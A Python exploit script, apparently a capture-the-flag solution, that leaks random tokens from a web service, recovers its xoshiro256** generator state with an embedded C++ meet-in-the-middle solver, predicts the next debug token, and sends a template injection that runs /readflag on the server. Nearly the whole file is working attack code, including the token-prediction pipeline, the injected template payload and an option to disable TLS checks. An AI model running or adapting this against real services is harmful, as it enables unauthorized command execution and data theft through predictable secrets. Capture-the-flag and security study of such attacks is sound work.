#!/usr/bin/env python3
import argparse
import base64
import functools
import gzip
import hashlib
import html
import http.client
import json
import os
import re
import ssl
import struct
import subprocess
import sys
import time
from pathlib import Path
from urllib.parse import urlsplit

MASK = (1 << 64) - 1
MAX_VALUE = 0x7FFFFFFF
ROOT = Path(__file__).resolve().parent
HELPER_CPP = ROOT / ".mafuyu_recover.cpp"
HELPER_BIN = ROOT / ".mafuyu_recover"

CPP_SOURCE = r'''#include <bits/stdc++.h>
#ifdef _OPENMP
#include <omp.h>
#endif
using namespace std;
struct Cand { uint64_t pat, in, flo; uint16_t fhi; };
struct Alt { uint16_t a,b; uint64_t flo; uint16_t fhi; };
struct PEntry { uint64_t syn; vector<Alt> alts; };
struct Key77 {
    uint64_t lo; uint16_t hi;
    bool operator==(Key77 const&o)const{return lo==o.lo&&hi==o.hi;}
};
struct KH {
    size_t operator()(Key77 const&k)const{
        return hash<uint64_t>{}(k.lo ^ (uint64_t(k.hi)*0x9e3779b97f4a7c15ULL));
    }
};
static vector<Cand> G[9];
static vector<PEntry> mkpair(int x,int y){
    unordered_map<uint64_t, vector<Alt>> m;
    m.reserve(G[x].size()*G[y].size()*2);
    for(uint16_t i=0;i<G[x].size();i++) for(uint16_t j=0;j<G[y].size();j++){
        uint64_t s=G[x][i].in^G[y][j].in;
        m[s].push_back({i,j,G[x][i].flo^G[y][j].flo,
                        uint16_t(G[x][i].fhi^G[y][j].fhi)});
    }
    vector<PEntry> v; v.reserve(m.size());
    for(auto &kv:m) v.push_back({kv.first,move(kv.second)});
    sort(v.begin(),v.end(),[](auto&a,auto&b){return a.syn<b.syn;});
    return v;
}
int main(int argc,char**argv){
    if(argc!=2){cerr<<"usage: recover input.bin\n";return 1;}
    FILE*f=fopen(argv[1],"rb"); if(!f){perror("input");return 1;}
    char mg[4]; uint32_t ng;
    if(fread(mg,1,4,f)!=4 || fread(&ng,4,1,f)!=1 || memcmp(mg,"RX41",4) || ng!=9){
        cerr<<"bad recovery input\n"; return 1;
    }
    for(int r=0;r<9;r++){
        uint32_t n; if(fread(&n,4,1,f)!=1)return 1;
        G[r].resize(n);
        for(auto &c:G[r]){
            if(fread(&c.pat,8,1,f)!=1 || fread(&c.in,8,1,f)!=1 ||
               fread(&c.flo,8,1,f)!=1 || fread(&c.fhi,2,1,f)!=1)return 1;
        }
    }
    fclose(f);
    auto A=mkpair(0,1),B=mkpair(2,3),C=mkpair(4,5),D=mkpair(6,8);
    vector<vector<uint16_t>> Bb(256),Db(256);
    for(uint16_t i=0;i<B.size();i++) Bb[B[i].syn&255].push_back(i);
    for(uint16_t i=0;i<D.size();i++) Db[D[i].syn&255].push_back(i);
    unordered_map<Key77,uint16_t,KH> need;
    need.reserve(G[7].size()*2);
    for(uint16_t i=0;i<G[7].size();i++) need[{G[7][i].flo,G[7][i].fhi}]=i;
    atomic<bool> found{false}; uint16_t answer[9]{};
    #pragma omp parallel for schedule(dynamic,1)
    for(int buck=0;buck<256;buck++){
        if(found.load(memory_order_relaxed))continue;
        vector<uint64_t>L,S;
        L.reserve((A.size()*B.size()+255)/256);
        S.reserve((C.size()*D.size()+255)/256);
        for(uint32_t ai=0;ai<A.size();ai++){
            unsigned req=buck^(A[ai].syn&255);
            for(uint16_t bi:Bb[req]){
                uint64_t s=A[ai].syn^B[bi].syn;
                L.push_back(((s>>8)<<30)|(uint64_t(ai)<<15)|bi);
            }
        }
        for(uint32_t ci=0;ci<C.size();ci++){
            unsigned req=buck^(C[ci].syn&255);
            for(uint16_t di:Db[req]){
                uint64_t s=C[ci].syn^D[di].syn;
                S.push_back(((s>>8)<<30)|(uint64_t(ci)<<15)|di);
            }
        }
        sort(L.begin(),L.end()); sort(S.begin(),S.end());
        size_t li=0,si=0;
        while(li<L.size()&&si<S.size()&&!found.load(memory_order_relaxed)){
            uint64_t lk=L[li]>>30,sk=S[si]>>30;
            if(lk<sk){li++;continue;} if(sk<lk){si++;continue;}
            size_t le=li+1,se=si+1;
            while(le<L.size()&&(L[le]>>30)==lk)le++;
            while(se<S.size()&&(S[se]>>30)==sk)se++;
            for(size_t lp=li;lp<le&&!found.load(memory_order_relaxed);lp++){
                uint64_t lr=L[lp];
                uint32_t ai=(lr>>15)&0x7fff,bi=lr&0x7fff;
                for(size_t sp=si;sp<se&&!found.load(memory_order_relaxed);sp++){
                    uint64_t sr=S[sp];
                    uint32_t ci=(sr>>15)&0x7fff,di=sr&0x7fff;
                    for(auto &aa:A[ai].alts) for(auto &bb:B[bi].alts)
                    for(auto &cc:C[ci].alts) for(auto &dd:D[di].alts){
                        Key77 k{aa.flo^bb.flo^cc.flo^dd.flo,
                                uint16_t(aa.fhi^bb.fhi^cc.fhi^dd.fhi)};
                        auto q=need.find(k);
                        if(q!=need.end()){
                            bool expected=false;
                            if(found.compare_exchange_strong(expected,true)){
                                uint16_t tmp[9]={aa.a,aa.b,bb.a,bb.b,cc.a,cc.b,
                                                 dd.a,q->second,dd.b};
                                memcpy(answer,tmp,sizeof(answer));
                            }
                        }
                    }
                }
            }
            li=le; si=se;
        }
    }
    if(!found)return 2;
    cout<<"FOUND";
    for(int i=0;i<9;i++)cout<<" "<<answer[i];
    cout<<"\n";
    return 0;
}
'''


def rol(value, shift):
    return ((value << shift) | (value >> (64 - shift))) & MASK


def xoshiro_step(state):
    a, b, c, d = state
    output = (rol((b * 5) & MASK, 7) * 9) & MASK
    t = (b << 17) & MASK
    c ^= a
    d ^= b
    b ^= c
    a ^= d
    c ^= t
    d = rol(d, 45)
    return output, (a & MASK, b & MASK, c & MASK, d & MASK)


def scale_raw(raw):
    product = (raw >> 32) * MAX_VALUE
    if (product & 0xFFFFFFFF) < 2:
        return None
    return product >> 32


def next_int(state):
    while True:
        raw, state = xoshiro_step(state)
        value = scale_raw(raw)
        if value is not None:
            return value, state


def inverse_scaled(value):
    q = 1 << 32
    lo = (value * q + MAX_VALUE - 1) // MAX_VALUE
    hi = (((value + 1) * q + MAX_VALUE - 1) // MAX_VALUE) - 1
    return [
        x for x in range(max(0, lo), min(q - 1, hi) + 1)
        if ((x * MAX_VALUE) & 0xFFFFFFFF) >= 2
    ]


def majority(a, b, c):
    return (a & b) | (a & c) | (b & c)


def state_patterns(high32):
    values = set()
    output_bits = [(high32 >> (j - 32)) & 1 for j in range(32, 64)]
    for guess in range(16):
        v = {29: guess & 1, 30: (guess >> 1) & 1, 31: (guess >> 2) & 1}
        carry = (guess >> 3) & 1
        for j in range(32, 64):
            v[j] = output_bits[j - 32] ^ v[j - 3] ^ carry
            carry = majority(v[j], v[j - 3], carry)
        rotated = {j - 7: v[j] for j in range(29, 64)}
        for low_guess in range(8):
            s = {20: low_guess & 1, 21: (low_guess >> 1) & 1}
            carry = (low_guess >> 2) & 1
            for j in range(22, 57):
                s[j] = rotated[j] ^ s[j - 2] ^ carry
                carry = majority(s[j], s[j - 2], carry)
            values.add(sum(s[j] << (j - 20) for j in range(20, 57)))
    return sorted(values)


def xor_words(*words):
    return [functools.reduce(int.__xor__, bits, 0) for bits in zip(*words)]


def shift_word(word, amount):
    return [0] * amount + word[:64 - amount]


def rotate_word(word, amount):
    return word[-amount:] + word[:-amount]


def rows_for_positions(positions):
    wanted = {position: index for index, position in enumerate(positions)}
    groups = [None] * len(positions)
    state = [[1 << (word * 64 + bit) for bit in range(64)] for word in range(4)]
    for tick in range(max(positions) + 1):
        a, b, c, d = state
        if tick in wanted:
            groups[wanted[tick]] = b[20:57]
        cp = xor_words(c, a)
        dp = xor_words(d, b)
        state = [
            xor_words(a, dp),
            xor_words(b, cp),
            xor_words(cp, shift_word(b, 17)),
            rotate_word(dp, 45),
        ]
    return [row for group in groups for row in group]


def left_nullspace(rows):
    pivots = {}
    nullspace = []
    for index, row in enumerate(rows):
        combination = 1 << index
        while row:
            pivot = row.bit_length() - 1
            if pivot not in pivots:
                pivots[pivot] = (row, combination)
                break
            row ^= pivots[pivot][0]
            combination ^= pivots[pivot][1]
        if not row:
            nullspace.append(combination)
    return len(pivots), nullspace


def ensure_helper():
    digest = hashlib.sha256(CPP_SOURCE.encode()).hexdigest()
    marker = HELPER_CPP.with_suffix(".sha256")
    current = marker.read_text().strip() if marker.exists() else ""
    if HELPER_BIN.exists() and current == digest:
        return
    HELPER_CPP.write_text(CPP_SOURCE)
    commands = [
        ["g++", "-O3", "-march=native", "-fopenmp", "-std=c++20", str(HELPER_CPP), "-o", str(HELPER_BIN)],
        ["g++", "-O3", "-march=native", "-std=c++20", str(HELPER_CPP), "-o", str(HELPER_BIN)],
    ]
    error = ""
    for command in commands:
        process = subprocess.run(command, capture_output=True, text=True)
        if process.returncode == 0:
            marker.write_text(digest)
            return
        error = process.stderr
    raise RuntimeError("failed to compile recovery helper:\n" + error)


def build_recovery_input(observations, positions, path):
    rows = rows_for_positions(positions)
    rank, full_null = left_nullspace(rows)
    if rank != 256:
        raise RuntimeError(f"unexpected state matrix rank: {rank}")

    subset = (0, 1, 2, 3, 4, 5, 6, 8)
    subset_rows = []
    for group in subset:
        subset_rows += rows[37 * group:37 * (group + 1)]
    _, internal_null = left_nullspace(subset_rows)
    if len(internal_null) > 64 or len(full_null) > 80:
        raise RuntimeError("unexpected syndrome width")

    groups = []
    for group_index, value in enumerate(observations):
        patterns = []
        for high32 in inverse_scaled(value):
            patterns += state_patterns(high32)
        patterns = sorted(set(patterns))
        encoded = []
        subset_position = subset.index(group_index) if group_index in subset else None
        for pattern in patterns:
            internal = 0
            full = 0
            if subset_position is not None:
                for bit, relation in enumerate(internal_null):
                    local = (relation >> (37 * subset_position)) & ((1 << 37) - 1)
                    if (local & pattern).bit_count() & 1:
                        internal |= 1 << bit
            for bit, relation in enumerate(full_null):
                local = (relation >> (37 * group_index)) & ((1 << 37) - 1)
                if (local & pattern).bit_count() & 1:
                    full |= 1 << bit
            encoded.append((pattern, internal, full))
        groups.append(encoded)

    with path.open("wb") as output:
        output.write(b"RX41")
        output.write(struct.pack("<I", 9))
        for group in groups:
            output.write(struct.pack("<I", len(group)))
            for pattern, internal, full in group:
                output.write(struct.pack(
                    "<QQQH", pattern, internal,
                    full & ((1 << 64) - 1), full >> 64,
                ))
    return rows, groups


def solve_linear(rows, right_hand_side):
    basis = {}
    values = {}
    for row, value in zip(rows, right_hand_side):
        reduced = row
        bit_value = value
        while reduced:
            pivot = reduced.bit_length() - 1
            if pivot in basis:
                reduced ^= basis[pivot]
                bit_value ^= values[pivot]
            else:
                basis[pivot] = reduced
                values[pivot] = bit_value
                break
        if not reduced and bit_value:
            raise RuntimeError("inconsistent recovered state")
    state_bits = 0
    for pivot in sorted(basis):
        lower = basis[pivot] & ((1 << pivot) - 1)
        bit = values[pivot] ^ ((lower & state_bits).bit_count() & 1)
        if bit:
            state_bits |= 1 << pivot
    return tuple((state_bits >> (64 * word)) & MASK for word in range(4))


def recover_state(observations, positions, label, threads):
    ensure_helper()
    input_path = ROOT / f".mafuyu_{os.getpid()}_{label}.bin"
    try:
        rows, groups = build_recovery_input(observations, positions, input_path)
        environment = os.environ.copy()
        environment["OMP_NUM_THREADS"] = str(threads)
        process = subprocess.run(
            [str(HELPER_BIN), str(input_path)],
            capture_output=True,
            text=True,
            env=environment,
            timeout=300,
        )
        if process.returncode != 0:
            return None
        match = re.search(r"^FOUND((?:\s+\d+){9})$", process.stdout, re.MULTILINE)
        if not match:
            raise RuntimeError("invalid recovery helper output")
        indexes = [int(value) for value in match.group(1).split()]
        rhs = []
        for group_index, candidate_index in enumerate(indexes):
            pattern = groups[group_index][candidate_index][0]
            rhs += [(pattern >> bit) & 1 for bit in range(37)]
        return solve_linear(rows, rhs)
    finally:
        try:
            input_path.unlink()
        except FileNotFoundError:
            pass


def outputs_at_positions(state, positions):
    wanted = set(positions)
    output = {}
    for tick in range(max(positions) + 1):
        value, state = next_int(state)
        if tick in wanted:
            output[tick] = value
    return [output[position] for position in positions]


def advance_calls(state, count):
    for _ in range(count):
        _, state = next_int(state)
    return state


def locate_pair(state, pair, limit=20000):
    previous = None
    for index in range(limit):
        value, next_state = next_int(state)
        if previous == pair[0] and value == pair[1]:
            return next_state, index + 1
        previous = value
        state = next_state
    return None


def encode_token(value):
    return base64.b64encode(str(value).encode("ascii")).decode("ascii")


def decode_token(token):
    decoded = base64.b64decode(str(token), validate=True).decode("ascii")
    if not decoded.isdigit():
        raise ValueError("leaked token is not a decimal integer")
    value = int(decoded)
    if not 0 <= value < MAX_VALUE:
        raise ValueError("leaked token is outside Random.Next range")
    return value


class HttpClient:
    def __init__(self, target, insecure=False, timeout=15):
        parsed = urlsplit(target)
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            raise ValueError("target must be an http:// or https:// URL")
        self.scheme = parsed.scheme
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.prefix = parsed.path.rstrip("/")
        self.insecure = insecure
        self.timeout = timeout
        self.connection = None

    def _connect(self):
        if self.scheme == "https":
            context = ssl._create_unverified_context() if self.insecure else ssl.create_default_context()
            self.connection = http.client.HTTPSConnection(
                self.host, self.port, timeout=self.timeout, context=context
            )
        else:
            self.connection = http.client.HTTPConnection(
                self.host, self.port, timeout=self.timeout
            )

    def post_json(self, path, payload):
        body = json.dumps(payload, separators=(",", ":")).encode()
        headers = {
            "content-type": "application/json",
            "accept": "application/json,text/html,*/*",
            "user-agent": "mafuyu-solver/1.0",
            "connection": "keep-alive",
        }
        last_error = None
        for _ in range(2):
            try:
                if self.connection is None:
                    self._connect()
                self.connection.request("POST", self.prefix + path, body=body, headers=headers)
                response = self.connection.getresponse()
                raw = response.read()
                if response.getheader("content-encoding", "").lower() == "gzip":
                    raw = gzip.decompress(raw)
                return response.status, raw.decode("utf-8", "replace")
            except (OSError, http.client.HTTPException) as error:
                last_error = error
                try:
                    self.connection.close()
                except Exception:
                    pass
                self.connection = None
        raise RuntimeError(f"HTTP request failed: {last_error}")


def leak_pair(client):
    status, text = client.post_json(
        "/api/desk/posts",
        {"category": "story", "message": "queued"},
    )
    if status // 100 != 2:
        raise RuntimeError(f"post leak failed with HTTP {status}: {text[:300]}")
    try:
        data = json.loads(text)
    except json.JSONDecodeError as error:
        raise RuntimeError(f"unexpected post response: {text[:300]}") from error

    lowered = {str(key).lower(): value for key, value in data.items()}

    first = lowered.get("postid", lowered.get("id"))
    second = lowered.get("cspnonce", lowered.get("csp"))

    if first is None or second is None:
        raise RuntimeError(f"post response lacks leaked tokens: {data}")

    try:
        return decode_token(first), decode_token(second)
    except (ValueError, TypeError) as error:
        raise RuntimeError(f"invalid leaked tokens in post response: {data}") from error

def recover_initial_state(leaks, threads):
    hypotheses = [None, 2, 4, 6, 8]
    for boundary in hypotheses:
        positions = [
            index + (3 if boundary is not None and index >= boundary else 0)
            for index in range(10)
        ]
        gap_label = "none" if boundary is None else f"before leak {boundary + 1}"
        print(f"[*] testing health gap: {gap_label}", flush=True)
        state = recover_state(leaks[:9], positions[:9], str(boundary), threads)
        if state is not None and outputs_at_positions(state, positions) == leaks:
            print(f"[+] recovered xoshiro256** state ({gap_label})", flush=True)
            return state, positions
    raise RuntimeError(
        "state recovery failed; the initial burst likely crossed more than one health probe"
    )


def run_debug(client, token):
    template = "{{ debug(" + token + ",/readflag) }}"
    return client.post_json(
        "/api/sekai/story-lab/render",
        {"template": template, "user": "mafuyu", "variables": {}},
    )


def exploit(target, threads, insecure=False, attempts=6):
    client = HttpClient(target, insecure=insecure)
    leaks = []
    started = time.monotonic()
    for index in range(5):
        pair = leak_pair(client)
        leaks.extend(pair)
        print(f"[+] leak {index + 1}/5: {pair[0]}, {pair[1]}", flush=True)
    print(f"[*] leak burst completed in {time.monotonic() - started:.3f}s", flush=True)

    initial_state, positions = recover_initial_state(leaks, threads)
    cursor = advance_calls(initial_state, positions[-1] + 1)

    flag_pattern = re.compile(r"(?i)\b[a-z0-9_]+\{[^\r\n{}]{1,300}\}")
    for attempt in range(1, attempts + 1):
        fresh_pair = leak_pair(client)
        synchronized = locate_pair(cursor, fresh_pair)
        if synchronized is None:
            raise RuntimeError(
                "fresh leak was not found in the predicted stream; the service probably restarted"
            )
        state_after_pair, consumed = synchronized
        predicted, _ = next_int(state_after_pair)
        token = encode_token(predicted)
        hidden = consumed - 2
        print(
            f"[*] debug attempt {attempt}: synchronized past {hidden} hidden RNG calls",
            flush=True,
        )
        status, response = run_debug(client, token)
        decoded_response = html.unescape(response)
        match = flag_pattern.search(decoded_response)
        if match:
            return match.group(0)
        if status // 100 != 2:
            raise RuntimeError(
                f"story render failed with HTTP {status}: {response[:500]}"
            )
        print("[-] token lost a health-probe race; leaking again", flush=True)
        cursor = state_after_pair
    raise RuntimeError("debug token kept losing the health-probe race")


def normalize_target(values):
    if len(values) == 2 and values[1].isdigit():
        target = f"http://{values[0]}:{values[1]}"
    elif len(values) == 1:
        target = values[0]
        if "://" not in target:
            target = "http://" + target
    else:
        raise ValueError("use either URL or HOST PORT")
    return target.rstrip("/")


def main():
    parser = argparse.ArgumentParser(
        description="mafuyuuuuu RNG state recovery and debug lease exploit"
    )
    parser.add_argument("target", nargs="+", help="URL, or HOST PORT")
    parser.add_argument(
        "--threads",
        type=int,
        default=int(os.environ.get("MAFUYU_THREADS", min(24, os.cpu_count() or 1))),
        help="C++ recovery worker count",
    )
    parser.add_argument("--insecure", action="store_true", help="disable TLS verification")
    parser.add_argument("--attempts", type=int, default=6, help="maximum debug race retries")
    args = parser.parse_args()
    try:
        target = normalize_target(args.target)
        if args.threads < 1:
            raise ValueError("--threads must be positive")
        flag = exploit(target, args.threads, args.insecure, args.attempts)
        print(f"<FLAG>{flag}</FLAG>")
    except KeyboardInterrupt:
        print("\n[-] interrupted", file=sys.stderr)
        raise SystemExit(130)
    except Exception as error:
        print(f"[-] {error}", file=sys.stderr)
        raise SystemExit(1)


if __name__ == "__main__":
    main()
